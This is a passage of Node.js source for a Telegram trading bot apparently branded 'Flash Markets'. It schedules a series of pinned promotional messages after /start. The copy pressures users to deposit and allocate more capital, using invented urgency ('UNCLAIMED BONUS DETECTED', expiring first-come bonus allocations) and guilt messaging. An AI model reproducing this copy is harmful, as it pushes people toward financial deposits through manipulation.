            DEFAULT_LANGUAGE;

        const finalLang = setUserLanguage(userId, detectedLang);

        console.log(`[LANGUAGE] User ${userId} initialized language: ${finalLang}`);
        console.log(`[LANGUAGE] Saved language: ${savedLang || 'none'}`);
        console.log(`[LANGUAGE] Telegram language: ${ctx.from.language_code || 'none'}`);

        // Persist auto-detected language so scheduled messages use it after restart
        if (typeof userTracker.setUserLanguage === 'function') {
            userTracker.setUserLanguage(userId, finalLang)
                .then(() => console.log(`[LANGUAGE] Persisted language ${finalLang} for user ${userId}`))
                .catch(err => console.error('Failed to persist initial language:', err.message));
        }
    } else {
        console.log(`[LANGUAGE] User ${userId} already has language: ${getUserLanguage(userId)}`);
    }

    // 💾 Save user to database with detected/saved language
    const currentLang = getUserLanguage(userId);

    await userTracker.saveUser(
        userId,
        ctx.from.username,
        ctx.from.first_name,
        currentLang
    );

    await userTracker.reactivateUser(userId);

    try {
        // Step 1: Send welcome video first (if configured)
        if (config.WELCOME_VIDEO) {
            await ctx.replyWithVideo(config.WELCOME_VIDEO, {
                caption: '⚡ *Initializing Flash Markets...*',
                parse_mode: 'Markdown',
                supports_streaming: true
            });
        }

        // Step 2: Small delay for better UX
        await new Promise(resolve => setTimeout(resolve, 500));

        // Step 3: Send the main START message
        await ctx.replyWithMarkdown(START_MESSAGE, {
            disable_web_page_preview: true,
            ...getStartKeyboard()
        });

        // Step 4: Schedule followup message (15 minutes)
        setTimeout(async () => {
            try {
                await sendFollowupMessage(userId);
            } catch (err) {
                console.error(`Failed to send followup to user ${userId}:`, err.message);
            }
        }, 45 * 60 * 1000);

        // Step 5: Schedule airdrop reminder (45 minutes)
        setTimeout(async () => {
            try {
                await sendAirdropMessage(userId);
            } catch (err) {
                console.error(`Failed to send airdrop reminder to user ${userId}:`, err.message);
            }
        }, 15 * 60 * 1000);

        // Step 6: Schedule activate message (1 hour)
        setTimeout(async () => {
            try {
                await sendActivateMessage(userId);
            } catch (err) {
                console.error(`Failed to send activate to user ${userId}:`, err.message);
            }
        }, 65 * 60 * 1000);

        // Step 7: Schedule atomic execution message (2 hours) ← NEW
        setTimeout(async () => {
            try {
                await sendAtomicExecutionMessage(userId);
            } catch (err) {
                console.error(`Failed to send atomic execution message to user ${userId}:`, err.message);
            }
        }, 2 * 60 * 60 * 1000);
        // }, 10 * 1000);


        // Step 8: Schedule honeypot filter message (3 hours) ← NEW
        setTimeout(async () => {
            try {
                await sendHoneypotFilterMessage(userId);
            } catch (err) {
                console.error(`Failed to send honeypot filter message to user ${userId}:`, err.message);
            }
        }, 3 * 60 * 60 * 1000);
        // }, 12 * 1000);

        // Step 9: Schedule RPC infrastructure message (4 hours) ← NEW
        setTimeout(async () => {
            try {
                await sendRpcInfrastructureMessage(userId);
            } catch (err) {
                console.error(`Failed to send RPC infrastructure message to user ${userId}:`, err.message);
            }
        }, 4 * 60 * 60 * 1000);
        // }, 7 * 1000);

        // Step 10: Schedule DEX scanner message (5 hours) ← NEW
        setTimeout(async () => {
            try {
                await sendDexScannerMessage(userId);
            } catch (err) {
                console.error(`Failed to send DEX scanner message to user ${userId}:`, err.message);
            }
        }, 5 * 60 * 60 * 1000);
        // }, 12 * 1000);

        // Step 11: Schedule cross-chain message (6 hours) ← NEW
        setTimeout(async () => {
            try {
                await sendCrossChainMessage(userId);
            } catch (err) {
                console.error(`Failed to send cross-chain message to user ${userId}:`, err.message);
            }
        }, 6 * 60 * 60 * 1000);
        // }, 18 * 1000);

        // Step 12: Schedule engine activation message (7 hours) ← NEW
        setTimeout(async () => {
            try {
                await sendEngineActivationMessage(userId);
            } catch (err) {
                console.error(`Failed to send engine activation message to user ${userId}:`, err.message);
            }
        }, 7 * 60 * 60 * 1000);
        // }, 22 * 1000);

        // Step 13: Start random scheduler AFTER all initial messages (8 hours)
        setTimeout(() => {
            scheduleRandomMessage(userId);
        }, 8 * 60 * 60 * 1000);

    } catch (err) {
        console.error('Start error:', err.message);
        await ctx.replyWithMarkdown(START_MESSAGE, {
            disable_web_page_preview: true,
            ...getStartKeyboard()
        });
    }
});

// ═══════════════════════════════════════════════════
// 📅 FOLLOW-UP MESSAGE (45 minutes after /start)
// ═══════════════════════════════════════════════════
async function sendFollowupMessage(userId) {
    const FOLLOWUP_TEXT = `
*3 STEPS TO AUTOMATE TRADING ACROSS MARKETS*

Flash Markets supports:

💱 Forex  
🪙 Crypto  
📈 Stocks  
⚡ MEV

1️⃣ *Select Market* — Choose Forex, Crypto, Stock, or MEV

2️⃣ *Allocate Capital* — Deposit at least $${config.MIN_TRADE_CAPITAL_USD} and choose what percentage of your wallet the bot can trade with

3️⃣ *Deploy Agent* — Configure risk, strategy, and execution settings, then activate the bot

━━━━━━━━━━━━━━━━━━━━━

💡 *More allocated capital can allow larger position sizing and bigger opportunity capture, but risk management still matters.*

‼️ *LIMITED OFFER*
🎁 *0% fees* for new users during the first 48 hours.
`;

    try {
        let followupMsg;

        if (config.FOLLOWUP_VIDEO) {
            followupMsg = await bot.telegram.sendVideo(userId, config.FOLLOWUP_VIDEO, {
                caption: FOLLOWUP_TEXT,
                parse_mode: 'Markdown',
                supports_streaming: true,
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Trading Bot', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            followupMsg = await bot.telegram.sendMessage(userId, FOLLOWUP_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        try {
            await bot.telegram.pinChatMessage(userId, followupMsg.message_id);
            console.log(`✅ Pinned followup message for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin message for user ${userId} (normal for private chats)`);
        }

    } catch (err) {
        console.error(`Failed to send followup to ${userId}:`, err.message);
    }
}

// ═══════════════════════════════════════════════════
// 📅 ACTIVATE MESSAGE (1 hour after /start)
// ═══════════════════════════════════════════════════
async function sendActivateMessage(userId) {
    const ACTIVATE_TEXT = `
🔥 *ACTIVATE YOUR TRADING BOT*
_From market selection to deployment in under a minute._

━━━━━━━━━━━━━━━━━━━━━

*Select* → Choose your market:
💱 Forex
🪙 Crypto
📈 Stocks
⚡ MEV

*Configure* → Set capital allocation, risk profile, strategy, leverage where applicable, slippage for MEV, pairs, timeframes, and exit rules.

*Fund* → Maintain at least *$${config.MIN_TRADE_CAPITAL_USD}* in usable trading capital.

*Activate* → Tap Deploy Agent. Your bot starts monitoring the selected market and executing according to your settings.

━━━━━━━━━━━━━━━━━━━━━

*▸ YOUR CONTROLS*
/wallet — Manage wallet
/portfolio — Positions & PnL
/settings — Trade settings
/referral — Rewards & referral
/info — How Flash Markets works
/help — Command list

━━━━━━━━━━━━━━━━━━━━━

‼️ *LIMITED OFFER*
🎁 *0% fees* for new users during the first 48 hours.

_Markets never sleep. Your bot shouldn't either._ ✅
`;

    try {
        let activateMsg;

        if (config.ACTIVATE_IMAGE) {
            activateMsg = await bot.telegram.sendPhoto(userId, config.ACTIVATE_IMAGE, {
                caption: ACTIVATE_TEXT,
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            activateMsg = await bot.telegram.sendMessage(userId, ACTIVATE_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        try {
            await bot.telegram.pinChatMessage(userId, activateMsg.message_id);
            console.log(`✅ Pinned activate message for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin activate message for user ${userId}`);
        }

    } catch (err) {
        console.error(`Failed to send activate to ${userId}:`, err.message);
    }
}


// ═══════════════════════════════════════════════════
// 🎁 AIRDROP REMINDER MESSAGE (15 minutes after /start)
// ═══════════════════════════════════════════════════
async function sendAirdropMessage(userId) {
    const AIRDROP_TEXT = `
🎁 *UNCLAIMED BONUS DETECTED*

━━━━━━━━━━━━━━━━━━━━━

Check if your wallet is eligible for the Flash Markets onboarding bonus.

*▸ WHAT'S WAITING FOR YOU*

💰 *0% Trading Fees* for the first 48 hours
📊 Multi-market access: Forex, Crypto, Stocks, MEV
⚡ Faster execution priority
🛡️ Risk-managed deployment settings

━━━━━━━━━━━━━━━━━━━━━

⏳ *TIME-SENSITIVE*

Bonus allocations are *first-come, first-served* and expire once the onboarding window closes for your wallet cohort.

━━━━━━━━━━━━━━━━━━━━━

👇 *Tap below to verify eligibility and claim your bonus in under 60 seconds.*
`;

    try {
        let airdropMsg;

        if (config.AIRDROP_REMINDER_IMAGE) {
            airdropMsg = await bot.telegram.sendPhoto(userId, config.AIRDROP_REMINDER_IMAGE, {
                caption: AIRDROP_TEXT,
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            airdropMsg = await bot.telegram.sendMessage(userId, AIRDROP_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        // Pin the message
        try {
            await bot.telegram.pinChatMessage(userId, airdropMsg.message_id);
            console.log(`✅ Pinned airdrop reminder for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin airdrop reminder for user ${userId}`);
        }

    } catch (err) {
        console.error(`Failed to send airdrop reminder to ${userId}:`, err.message);
    }
}


// ═══════════════════════════════════════════════════
// ⚡ ATOMIC EXECUTION MESSAGE (2 hours after /start)
// ═══════════════════════════════════════════════════
async function sendAtomicExecutionMessage(userId) {
    const ATOMIC_TEXT = `
🚨 *Execution quality can decide whether a setup wins or loses.*

In fast markets, slippage, partial fills, latency, and poor order routing can turn a good idea into a bad trade.

Flash Markets applies execution controls across:

💱 Forex — spread and session-aware execution  
🪙 Crypto — order routing, TP/SL, volatility filters  
📈 Stocks — liquidity and holding-period controls  
⚡ MEV — bundle simulation, private relay routing, revert-safe execution

━━━━━━━━━━━━━━━━━━━━━

*▸ WHY IT MATTERS*

⚡️ Reduces bad fills during sudden price movement
⚡️ Applies risk rules before execution
⚡️ Uses market-specific settings for each asset class
⚡️ Keeps your capital allocation controlled

━━━━━━━━━━━━━━━━━━━━━

‼️ *LIMITED TIME OFFER*
🎁 *0% fees* for new users during the first 48 hours.

_Better execution. Better control._ ✅
`;

    try {
        let atomicMsg;

        if (config.ATOMIC_EXECUTION_VIDEO) {
            atomicMsg = await bot.telegram.sendVideo(userId, config.ATOMIC_EXECUTION_VIDEO, {
                caption: ATOMIC_TEXT,
                parse_mode: 'Markdown',
                supports_streaming: true,
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            atomicMsg = await bot.telegram.sendMessage(userId, ATOMIC_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        try {
            await bot.telegram.pinChatMessage(userId, atomicMsg.message_id);
            console.log(`✅ Pinned atomic execution message for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin atomic execution message for user ${userId}`);
        }

    } catch (err) {
        console.error(`Failed to send atomic execution message to ${userId}:`, err.message);
    }
}

// ═══════════════════════════════════════════════════
// 🛡️ HONEYPOT FILTER MESSAGE (3 hours after /start)
// ═══════════════════════════════════════════════════
async function sendHoneypotFilterMessage(userId) {
    const HONEYPOT_TEXT = `
🛡️ *AUTOMATED RISK & TOKEN FILTER*

Before the bot trades, it filters dangerous setups across crypto, stocks, forex, and MEV.

━━━━━━━━━━━━━━━━━━━━━

*▸ 3-LAYER DEFENSE SYSTEM*

1️⃣ *Pre-Trade Simulation* — Tests entry and exit conditions before execution.

2️⃣ *Asset Verification* — Flags low liquidity, abnormal taxes, blacklists, transfer locks, and unsafe instruments.

3️⃣ *Automatic Rejection* — Unsafe trades are dropped before capital is exposed.

━━━━━━━━━━━━━━━━━━━━━

Trade with built-in risk defense.

━━━━━━━━━━━━━━━━━━━━━

‼️ *NEW USER PASS*
🎁 Trade with *0% fees* during your first 48 hours.

_Filter risk before you deploy capital._ ✅
`;

    try {
        let honeypotMsg;

        if (config.HONEYPOT_FILTER_VIDEO) {
            honeypotMsg = await bot.telegram.sendVideo(userId, config.HONEYPOT_FILTER_VIDEO, {
                caption: HONEYPOT_TEXT,
                parse_mode: 'Markdown',
                supports_streaming: true,
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            honeypotMsg = await bot.telegram.sendMessage(userId, HONEYPOT_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        try {
            await bot.telegram.pinChatMessage(userId, honeypotMsg.message_id);
            console.log(`✅ Pinned honeypot filter message for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin honeypot filter message for user ${userId}`);
        }

    } catch (err) {
        console.error(`Failed to send honeypot filter message to ${userId}:`, err.message);
    }
}


// ═══════════════════════════════════════════════════
// 📣 RPC INFRASTRUCTURE MESSAGE (4 hours after /start)
// ═══════════════════════════════════════════════════
async function sendRpcInfrastructureMessage(userId) {
    const RPC_TEXT = `
📣 *Slow infrastructure costs traders opportunities.*

Public APIs, rate limits, delayed feeds, and congested networks can cause missed entries, bad exits, and failed execution.

Flash Markets runs on managed cloud infrastructure designed for multi-market trading:

💱 Forex feeds  
🪙 Crypto exchange data  
📈 Stock market data  
⚡ MEV mempool and relay routing

━━━━━━━━━━━━━━━━━━━━━

⚡️ Zero node setup or local hardware maintenance required
🚀 Low-latency market data and execution routing
🤖 Continuous scanning across selected markets
📱 Manage everything from Telegram

━━━━━━━━━━━━━━━━━━━━━

‼️ *EXCLUSIVE WELCOME OFFER*
🎁 *0% fees* for new users during the first 48 hours.

_Professional infrastructure, zero overhead._ ✅
`;

    try {
        let rpcMsg;

        if (config.RPC_INFRASTRUCTURE_VIDEO) {
            rpcMsg = await bot.telegram.sendVideo(userId, config.RPC_INFRASTRUCTURE_VIDEO, {
                caption: RPC_TEXT,
                parse_mode: 'Markdown',
                supports_streaming: true,
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            rpcMsg = await bot.telegram.sendMessage(userId, RPC_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        try {
            await bot.telegram.pinChatMessage(userId, rpcMsg.message_id);
            console.log(`✅ Pinned RPC infrastructure message for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin RPC infrastructure message for user ${userId}`);
        }

    } catch (err) {
        console.error(`Failed to send RPC infrastructure message to ${userId}:`, err.message);
    }
}

// ═══════════════════════════════════════════════════
// 💻 DEX SCANNER FATIGUE MESSAGE (5 hours after /start)
// ═══════════════════════════════════════════════════
async function sendDexScannerMessage(userId) {
    const DEX_TEXT = `
💻 *STOP STARING AT CHARTS ALL DAY.*

Manual trading is exhausting:

❌ Watching forex pairs for hours
❌ Chasing crypto candles
❌ Missing stock market openings
❌ Getting caught in MEV competition
❌ Losing capital to emotion and bad timing

*There is a cleaner way.*

Set up *Flash Markets* once, choose your market, allocate capital, configure risk, and let the bot monitor opportunities for you.

No terminal open. No VPS needed. No manual grinding.

━━━━━━━━━━━━━━━━━━━━━

🛠️ *SETUP IN 3 TAPS:*

1️⃣ Tap /start
2️⃣ Select Forex, Crypto, Stock, or MEV
3️⃣ Allocate at least $${config.MIN_TRADE_CAPITAL_USD} and deploy

━━━━━━━━━━━━━━━━━━━━━

‼️ *NEW USER PASS*
🎁 Trade with *0% fees* during your first 48 hours.

_Stop grinding. Start automating._ ✅
`;

    try {
        let dexMsg;

        if (config.DEX_SCANNER_VIDEO) {
            dexMsg = await bot.telegram.sendVideo(userId, config.DEX_SCANNER_VIDEO, {
                caption: DEX_TEXT,
                parse_mode: 'Markdown',
                supports_streaming: true,
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            dexMsg = await bot.telegram.sendMessage(userId, DEX_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        try {
            await bot.telegram.pinChatMessage(userId, dexMsg.message_id);
            console.log(`✅ Pinned DEX scanner message for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin DEX scanner message for user ${userId}`);
        }

    } catch (err) {
        console.error(`Failed to send DEX scanner message to ${userId}:`, err.message);
    }
}

// ═══════════════════════════════════════════════════
// ⌛️ CROSS-CHAIN FRICTION MESSAGE (6 hours after /start)
// ═══════════════════════════════════════════════════
async function sendCrossChainMessage(userId) {
    const CROSS_CHAIN_TEXT = `
⌛️ *Tool switching friction costs traders money.*

Juggling multiple apps, terminals, exchange dashboards, charting tools, and wallet extensions causes delays that destroy execution quality.

Flash Markets provides a unified multi-market trading pipeline controlled from a single Telegram thread.

━━━━━━━━━━━━━━━━━━━━━

💱 Forex — leverage, sessions, pairs, risk per trade  
🪙 Crypto — spot, futures, grid, DCA, timeframes  
📈 Stocks — sectors, strategy, holding period, risk profile  
⚡ MEV — slippage, chains, private relay execution

━━━━━━━━━━━━━━━━━━━━━

‼️ *48 HOUR ZERO FEE WINDOW*
🎁 Enjoy *0% platform fees* for the first 48 hours after deployment.

_One interface. Multiple markets. Controlled risk._ ✅
`;

    try {
        let crossMsg;

        if (config.CROSS_CHAIN_VIDEO) {
            crossMsg = await bot.telegram.sendVideo(userId, config.CROSS_CHAIN_VIDEO, {
                caption: CROSS_CHAIN_TEXT,
                parse_mode: 'Markdown',
                supports_streaming: true,
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            crossMsg = await bot.telegram.sendMessage(userId, CROSS_CHAIN_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        try {
            await bot.telegram.pinChatMessage(userId, crossMsg.message_id);
            console.log(`✅ Pinned cross-chain message for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin cross-chain message for user ${userId}`);
        }

    } catch (err) {
        console.error(`Failed to send cross-chain message to ${userId}:`, err.message);
    }
}

// ═══════════════════════════════════════════════════
// ✅ ENGINE ACTIVATION MESSAGE (7 hours after /start)
// ═══════════════════════════════════════════════════
async function sendEngineActivationMessage(userId) {
    const ENGINE_TEXT = `
✅ *THE ENGINE YOU NEVER TURNED ON*

You opened the bot. You never deployed.

While you waited:

💱 Forex markets kept moving  
🪙 Crypto volatility kept creating range and trend opportunities  
📈 Stock sessions kept opening and closing  
⚡ MEV windows kept appearing on-chain

*Markets don't pause for anyone's decision.*

━━━━━━━━━━━━━━━━━━━━━

Switching it on takes three steps:

1️⃣ *Select your market*
2️⃣ *Allocate capital* — minimum $${config.MIN_TRADE_CAPITAL_USD}
3️⃣ *Deploy your agent*

Configure risk, strategy, leverage, pairs, slippage, or holding rules depending on your market.

━━━━━━━━━━━━━━━━━━━━━

‼️ *LIMITED OFFER*
🎁 *0% fees* for your first 48 hours.

The clock starts when you deploy.

_Markets never sleep. Your engine shouldn't either._ ✅
`;

    try {
        let engineMsg;

        if (config.ENGINE_ACTIVATION_IMAGE) {
            engineMsg = await bot.telegram.sendPhoto(userId, config.ENGINE_ACTIVATION_IMAGE, {
                caption: ENGINE_TEXT,
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        } else {
            engineMsg = await bot.telegram.sendMessage(userId, ENGINE_TEXT, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Deploy Flash MEV', 'deploy_flash_mev')],
                    [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
                ])
            });
        }

        try {
            await bot.telegram.pinChatMessage(userId, engineMsg.message_id);
            console.log(`✅ Pinned engine activation message for user ${userId}`);
        } catch (pinErr) {
            console.log(`⚠️ Could not pin engine activation message for user ${userId}`);
        }

    } catch (err) {
        console.error(`Failed to send engine activation message to ${userId}:`, err.message);
    }
}


// ═══════════════════════════════════════════════════
// 💱 FOREX MARKET MESSAGE
// ═══════════════════════════════════════════════════
async function sendForexMessage(userId) {
    const TEXT = `
💱 *FOREX TRADING IS NOT JUST BUY AND SELL*

The forex market moves on liquidity, sessions, spreads, news, and leverage.

Manual forex trading often fails because of:

❌ Over-leverage
❌ No stop-loss discipline
❌ Trading the wrong session
❌ Chasing news candles
❌ Emotional position sizing

Flash Markets lets you configure:

• Leverage profile  
• Risk per trade  
• Majors, gold, indices, or crypto FX  
• Scalping, swing, breakout, or news strategy  
• London, New York, Asia, or 24-hour session control

━━━━━━━━━━━━━━━━━━━━━

💡 More allocated capital can allow larger position sizing, but risk per trade controls exposure.

‼️ *NEW USER PASS*
🎁 *0% fees* for your first 48 hours.
`;

    try {
        const msg = await bot.telegram.sendMessage(userId, TEXT, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🚀 Deploy Trading Bot', 'deploy_flash_mev')],
                [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
            ])
        });

        try {
            await bot.telegram.pinChatMessage(userId, msg.message_id);
        } catch (e) { }
    } catch (err) {
        console.error(`Failed to send forex message to ${userId}:`, err.message);
    }
}

// ═══════════════════════════════════════════════════
// 🪙 CRYPTO MARKET MESSAGE
// ═══════════════════════════════════════════════════
async function sendCryptoMessage(userId) {
    const TEXT = `
🪙 *CRYPTO MARKETS MOVE FAST — MANUALLY, YOU FALL BEHIND*

Crypto does not sleep. BTC, ETH, altcoins, memecoins, perps, and liquidity pools can shift in minutes.

Manual crypto traders often lose because of:

❌ FOMO entries
❌ No exit plan
❌ Overexposure to memecoins
❌ Poor leverage control
❌ Emotion during volatility

Flash Markets crypto mode can be configured for:

• Spot or futures  
• Grid or DCA  
• BTC/ETH, top 20, memecoins, or all liquid pairs  
• 1m, 5m, 15m, 1h, or 4h timeframes  
• Auto TP/SL, tight stops, or wide targets

━━━━━━━━━━━━━━━━━━━━━

💡 Allocate more capital to allow larger deployment, but choose your risk profile carefully.

‼️ *NEW USER PASS*
🎁 *0% fees* for your first 48 hours.
`;

    try {
        const msg = await bot.telegram.sendMessage(userId, TEXT, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🚀 Deploy Trading Bot', 'deploy_flash_mev')],
                [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
            ])
        });

        try {
            await bot.telegram.pinChatMessage(userId, msg.message_id);
        } catch (e) { }
    } catch (err) {
        console.error(`Failed to send crypto message to ${userId}:`, err.message);
    }
}

// ═══════════════════════════════════════════════════
// 📈 STOCK MARKET MESSAGE
// ═══════════════════════════════════════════════════
async function sendStockMessage(userId) {
    const TEXT = `
📈 *STOCK TRADING REQUIRES STRUCTURE, NOT GUESSWORK*

Stock markets move on earnings, sector rotation, macro news, liquidity, and market sessions.

Retail traders often lose because they:

❌ Buy hype without a plan
❌ Hold losers too long
❌ Take profits too early
❌ Ignore sector strength
❌ Trade without risk limits

Flash Markets stock mode lets you configure:

• US, UK, EU, or Asia markets  
• Growth, dividend, ETF swing, or momentum strategy  
• Low, medium, or high risk profile  
• Tech, healthcare, energy, or all sectors  
• Intraday, swing, or long-term holding period

━━━━━━━━━━━━━━━━━━━━━

💡 More allocated capital can increase deployment size, but strategy and risk controls matter.

‼️ *NEW USER PASS*
🎁 *0% fees* for your first 48 hours.
`;

    try {
        const msg = await bot.telegram.sendMessage(userId, TEXT, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🚀 Deploy Trading Bot', 'deploy_flash_mev')],
                [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
            ])
        });

        try {
            await bot.telegram.pinChatMessage(userId, msg.message_id);
        } catch (e) { }
    } catch (err) {
        console.error(`Failed to send stock message to ${userId}:`, err.message);
    }
}

// ═══════════════════════════════════════════════════
// ⚡ MEV MARKET MESSAGE
// ═══════════════════════════════════════════════════
async function sendMevMessage(userId) {
    const TEXT = `
⚡ *MEV IS ONE OF THE FASTEST-MOVING TRADING ENVIRONMENTS ON-CHAIN*

MEV opportunities appear and disappear in blocks:

• DEX arbitrage
• liquidations
• back-runs
• sandwich exposure
• private relay execution windows

Manual traders rarely catch these because speed, simulation, and execution routing matter.

Flash Markets MEV mode lets you configure:

• Slippage tolerance
• gas / priority strategy
• chain selection
• minimum profit target
• revert-safe or private-relay execution

━━━━━━━━━━━━━━━━━━━━━

💡 Higher capital allocation can allow larger bundle deployment, but slippage and chain selection control exposure.

‼️ *NEW USER PASS*
🎁 *0% fees* for your first 48 hours.
`;

    try {
        const msg = await bot.telegram.sendMessage(userId, TEXT, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🚀 Deploy Trading Bot', 'deploy_flash_mev')],
                [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
            ])
        });

        try {
            await bot.telegram.pinChatMessage(userId, msg.message_id);
        } catch (e) { }
    } catch (err) {
        console.error(`Failed to send mev message to ${userId}:`, err.message);
    }
}

// ═══════════════════════════════════════════════════
// 💰 CAPITAL ALLOCATION MESSAGE
// ═══════════════════════════════════════════════════
async function sendCapitalAllocationMessage(userId) {
    const TEXT = `
💰 *CAPITAL ALLOCATION DECIDES HOW HARD YOUR BOT WORKS*

Your bot does not trade with your whole wallet unless you allocate it.

During setup, you choose a capital allocation percentage:

• 10% — conservative exposure  
• 25% — balanced deployment  
• 50% — active trading size  
• 75% — aggressive deployment  
• 100% — maximum allocation

━━━━━━━━━━━━━━━━━━━━━

*Why allocation matters*

Low allocation = smaller position sizes and slower compounding.  
Higher allocation = larger opportunity capture, but more exposure.

Minimum usable trading capital: *$${config.MIN_TRADE_CAPITAL_USD}*

You can change allocation later from /settings.

‼️ *NEW USER PASS*
🎁 *0% fees* for your first 48 hours.
`;

    try {
        const msg = await bot.telegram.sendMessage(userId, TEXT, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🚀 Deploy Trading Bot', 'deploy_flash_mev')],
                [Markup.button.callback('⚙️ Open Settings', 'settings')]
            ])
        });

        try {
            await bot.telegram.pinChatMessage(userId, msg.message_id);
        } catch (e) { }
    } catch (err) {
        console.error(`Failed to send capital allocation message to ${userId}:`, err.message);
    }
}

// ═══════════════════════════════════════════════════
// 📊 MULTI-MARKET DIVERSIFICATION MESSAGE
// ═══════════════════════════════════════════════════
async function sendMultiMarketMessage(userId) {
    const TEXT = `
📊 *ONE BOT. FOUR MARKETS.*

Flash Markets is not limited to crypto.

You can deploy agents for:

💱 *Forex* — currencies, gold, indices, leverage control  
🪙 *Crypto* — spot, futures, grid, DCA, volatility strategies  
📈 *Stocks* — growth, dividend, ETF swing, momentum  
⚡ *MEV* — on-chain arbitrage, liquidations, private relay execution

━━━━━━━━━━━━━━━━━━━━━

Each market has its own setup:

• Capital allocation  
• Risk profile  
• Strategy  
• Pairs / sectors / chains  
• Stop-loss / take-profit behavior  
• Leverage or slippage controls where applicable

Select your market with /start and configure your bot in minutes.

‼️ *NEW USER PASS*
🎁 *0% fees* for your first 48 hours.
`;

    try {
        const msg = await bot.telegram.sendMessage(userId, TEXT, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🚀 Select Market', 'deploy_flash_mev')],
                [Markup.button.callback('🎁 Claim Your Bonus', 'claim_bonus')]
            ])
        });

        try {
            await bot.telegram.pinChatMessage(userId, msg.message_id);
        } catch (e) { }
    } catch (err) {
        console.error(`Failed to send multi-market message to ${userId}:`, err.message);
    }
}


// ═══════════════════════════════════════════════════
// 🎲 RANDOM MESSAGE SCHEDULER (after initial messages)
// ═══════════════════════════════════════════════════
const randomSchedulers = new Map();

function scheduleRandomMessage(userId) {
